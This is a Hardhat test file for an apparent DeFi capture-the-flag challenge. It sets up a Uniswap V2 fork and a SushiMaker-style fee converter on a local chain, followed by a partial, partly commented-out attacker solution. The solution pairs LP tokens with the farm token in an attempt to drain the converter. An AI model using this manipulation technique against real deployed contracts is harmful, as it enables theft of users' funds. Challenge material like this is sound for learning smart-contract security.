import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let safuFactory: Contract;
let safuRouter: Contract;
let safuPair: Contract; // starts with just one trading pool: USDC-SAFU
let weth: Contract; // native token
let usdc: Contract; // base trading pair token
let safu: Contract; // farm token
let safuMaker: Contract;
let barAddress = "0x"+"11".repeat(20); // SushiBar contract address, irrelevant for exploit

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // deploying token contracts
  let wethFactory = await ethers.getContractFactory('WETH9')
  weth = await wethFactory.connect(admin).deploy()

  let usdcFactory = await ethers.getContractFactory('Token')
  usdc = await usdcFactory.connect(admin).deploy('USDC','USDC')
  await usdc.connect(admin).mintPerUser( // attacker gets 100
    [await admin.getAddress(), await attacker.getAddress()],
    [precision.mul(1_000_000), precision.mul(100)]
  )

  let safuTokenFactory = await ethers.getContractFactory('Token')
  safu = await safuTokenFactory.connect(admin).deploy('SAFU','SAFU')
  await safu.connect(admin).mintPerUser( // attacker gets 100
    [await admin.getAddress(), await attacker.getAddress()],
    [precision.mul(1_000_000), precision.mul(100)]
  )

  // deploying SafuSwap + SafuMaker contracts
  let safuFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode)
  safuFactory = await safuFactoryFactory.connect(admin).deploy(await admin.getAddress())

  let safuRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode)
  safuRouter = await safuRouterFactory.connect(admin).deploy(safuFactory.address,weth.address)

  let safuMakerFactory = await ethers.getContractFactory('SafuMakerV2')
  safuMaker = await safuMakerFactory.connect(admin).deploy(safuFactory.address,barAddress,safu.address,usdc.address)
  await safuFactory.connect(admin).setFeeTo(safuMaker.address)

  // adding initial liquidity
  await usdc.connect(admin).approve(safuRouter.address,ethers.constants.MaxUint256)
  await safu.connect(admin).approve(safuRouter.address,ethers.constants.MaxUint256)

  await safuRouter.connect(admin).addLiquidity( // creates pair
    usdc.address,
    safu.address,
    precision.mul(1_000_000),
    precision.mul(1_000_000),
    0,
    0,
    await admin.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )
  console.log('we create pair')
  // getting the USDC-SAFU trading pair
  let pairAddress = await safuFactory.getPair(usdc.address,safu.address)
  let safuPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, admin) // admin required for attach
  safuPair = safuPairFactory.attach(pairAddress)

  // simulates trading activity, as LP is issued to feeTo address for trading rewards
  await safuPair.connect(admin).transfer(safuMaker.address,precision.mul(10_000)) // 1% of LP




});

it("solves the challenge", async function () {

  // implement solution here
  // first thoughts
  // simple goal here, create new token, add Liquidity 
  // convert rentrant token & pwn contract with MiM router action maybe???

  // theres 1mil safu and 1mil usdc 1:1 ratio. 
  //second thought:
  // pwntoken - usdc pair, generate liquidity at a 1 : 1_000_000 ratio. 0.000001 pwn = 1$
  // 100usdc = 0.000001
  // idea is to spoofpeg the price of pwntoken at x value, then trade that against pairtoken. 
  

  let spoofTokenFactory = await ethers.getContractFactory('Token')
  let spoof = await spoofTokenFactory.connect(attacker).deploy('SPOOF','SPOOFU')
  await spoof.connect(attacker).mintPerUser( // attacker gets 2 MIL
    [await attacker.getAddress(), await attacker.getAddress()],
    [precision.mul(1_000_000), precision.mul(1_000_000)]
  )

  // adding initial liquidity
  await usdc.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)
  await spoof.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)
  await safu.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)
  await safuPair.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)

  console.log('adding liquidity')
  // generates 10 liquidity tokens for user
  await safuRouter.connect(attacker).addLiquidity(
    usdc.address,
    safu.address,
    precision.mul(10),
    precision.mul(10),
    0,
    0,
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )  
  // quick read over the solution, was in the right direction. just getting stuck.
  await safuRouter.connect(attacker).addLiquidity(
    safuPair.address,
    safu.address,
    precision.mul(1),
    100,
    0,
    0,
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )  


  const pwnLiquidity = await safuPair.connect(attacker).balanceOf(await attacker.getAddress());
  console.log(pwnLiquidity.toString())
  // console.log(precision.div(pwnLiquidity))

    // await safuRouter.connect(attacker).addLiquidity( // creates pair
    //   safu.address,
    //   spoof.address,
    //   precision.mul(1),
    //   precision.div(1000000),
    //   0,
    //   0,
    //   await attacker.getAddress(),
    //   (await ethers.provider.getBlock('latest')).timestamp*2
    // ) 
    
    // getting the USDC-SPOOFU trading pair
    // let pairAddress = await safuFactory.getPair(safu.address, spoof.address)
    // let spoofuPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, attacker) // admin required for attach
    // let spoofuPair = spoofuPairFactory.attach(pairAddress)
    
    // const [usdcReserve, spoofuReserve] = await spoofuPair.connect(attacker).getReserves();
    // console.log('Spoofed Price (usd):', spoofuReserve/ usdcReserve)
    // console.log('Spoofed Price (usd):', usdcReserve/spoofuReserve)
    
    // const ts = await spoofuPair.connect(attacker).totalSupply();
    // await spoofuPair.connect(attacker).transfer(safuMaker.address, precision.div(pwnLiquidity).div(10)) // 1% of LP
    // console.log(parseInt(precision.div(ts).div(10).toString()))
    // console.log(parseInt(precision.div(ts).toString()))

    // let ffFactory = await ethers.getContractFactory('SafuMakerV2')
    // let freeLunch = ffFactory.attach(safuMaker.address);

    // await freeLunch.connect(attacker).convert(safu.address, safuPair.address)

});

/// expected final state
after(async () => {

  // attacker has increased both SAFU and USDC funds by at least 50x
  expect((await usdc.balanceOf(await attacker.getAddress())).div(precision)).to.be.gte(100*50)
  expect((await safu.balanceOf(await attacker.getAddress())).div(precision)).to.be.gte(100*50)

});